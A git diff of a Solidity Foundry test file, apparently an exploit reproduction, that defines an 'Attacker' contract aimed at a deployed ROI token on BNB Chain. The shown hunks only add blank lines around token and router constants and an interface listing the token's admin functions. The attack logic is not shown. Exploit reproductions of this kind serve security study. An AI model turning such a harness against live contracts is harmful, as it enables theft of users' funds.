@@ -20,6 +20,7 @@ CheatCodes constant cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12
 IROIToken constant ROI = IROIToken(0xE48b75dc1b131fd3A8364b0580f76eFD04cF6e9c);
 
 contract Attacker is Test {
+
     IERC20 constant busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
     IWBNB constant wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
     IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
@@ -119,11 +120,13 @@ contract Attacker is Test {
     }
 
     receive() external payable {}
+
 }
 
 /* -------------------- Interface -------------------- */
 
 interface IROIToken {
+
     function GetBuyBackTimeInterval() external view returns (uint256);
     function GetSwapMinutes() external view returns (uint256);
     function SetBuyBackDivisor(uint256 newDivisor) external;
@@ -233,4 +236,5 @@ interface IROIToken {
     function uniswapV2Pair() external view returns (address);
     function uniswapV2Router() external view returns (address);
     function unlock() external;
+
 }
